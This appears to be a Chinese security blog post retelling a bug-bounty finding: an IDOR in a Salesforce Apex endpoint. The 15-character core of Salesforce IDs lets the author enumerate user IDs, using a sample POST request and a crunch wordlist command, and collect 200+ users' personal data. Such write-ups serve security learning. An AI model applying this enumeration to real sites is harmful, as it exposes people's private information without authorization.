#  【实战】利用 Salesforce ID 格式特性实现用户遍历  
原创 Pwn1
                        Pwn1  漏洞集萃   2026-01-22 01:04  
  
   
  
> **免责声明**  
  
本公众号所发布的文章内容仅供学习与交流使用，禁止用于任何非法用途。  
  
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
1.    
  
1.    
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
  
   
  
   
  
   
  
<table><tbody><tr><td style="padding:20px;background:#fdfdfd;border:1px solid #e8e8e8;border-radius:14px;font-size:15px;background-image: repeating-linear-gradient(45deg, #fafafa, #fafafa 8px, #f5f5f5 8px, #f5f5f5 16px);"><p><span leaf="">原文链接</span></p><section><span leaf="">          https://brbr0s.medium.com/idor-allows-unauthorized-access-to-other-users-personal-data-8f73486cbab0</span></section></td></tr></tbody></table>  
  
   
  
分析 POST  
 请求的时候注意到了其 UID  
 的格式比较不同寻常  
```
POST /webruntime/api/apex/executeHost: my.example.comContent-Type: application/json{  "namespace": "",  "classname": "@udd/01p6S000009d5Kp",  "method": "getUserinfo",  "isContinuation": false,  "params": {    "userId": "005VM000007BILCYA4",    "networkId": "0DB6S000000TOwlWAG"  },  "cacheable": false}
```  
  
userId  
 ，其值采用 **Salesforce**  
 格式，例如 005VM000007BILCYA4  
 ，长度为 **18**  
 位  
  
随后创建一个新的账号并替换 UID  
 发包测试发现成功，于是尝试找到更多的 userId  
；  
  
此时注意到注意到其他每个帐户的前 **11**  
 位数字 005VM000007  
 都是固定的，所以我们仍然有 **7**  
 位数字，**暴力破解**  
在这里是没用的。  
  
通过继续搜索发现一个请求使用了略微相似的 ID005VM000007BILC  
 ，但它看起来比正常的请求短一些。  
  
此时发现：  
  
**去掉最后三位数字**  
。 YA4  
 而且，它在之前的请求中也有效。  
> **总结 ：**  
> 前 15 个字符是核心对象 ID 。最后 3 个字符只是一个不区分大小写的校验和 。在内部，Salesforce 仍然会仅使用 15 个字符的版本来识别记录。  
  
  
那么我们可以针对这个现象进行爆破  
```
crunch 4 4 ABCDEFGHIJKLMNOPQRSTUVWXYZ -d 1 -o wordlist.txt
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOJJGrWlfxNDDD9Vo75r6XcV1e6hGfBicUrGnpBKiaPhrdM9uICPicrrzYFKWfzDCACtG1HSZGK5ySY6A/640?wx_fmt=png&from=appmsg "")  
  
  
随后使用批量测试发现了 **200**  
 多个有效用户  
  
通过 POST  
 请求 我们发现了大量的**用户个人身份信息**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOJJGrWlfxNDDD9Vo75r6XcVt7pYjjXSJxqa5uTbcV9bkl8rMnsa2Ciba8rPIVa7lYmuFQKmJrvxENA/640?wx_fmt=png&from=appmsg "")  
  
  
  
   
  
   
  
  
觉得本文内容对您有启发或帮助？  
  
点个**关注➕**  
，获取更多深度分析与前沿资讯！  
  
  
👉 往期精选  
  
[API 渗透实战：从 JSON 响应倒推隐藏的高危路由](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484828&idx=1&sn=376a99fecd6210283cc43c2a79633b26&scene=21#wechat_redirect)  
  
  
[【从公开报告到私有神器】：如何通过漏洞报告制作字典](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484779&idx=1&sn=5a96dcbe955001b24cfdfb9d3bf4a468&scene=21#wechat_redirect)  
  
  
  
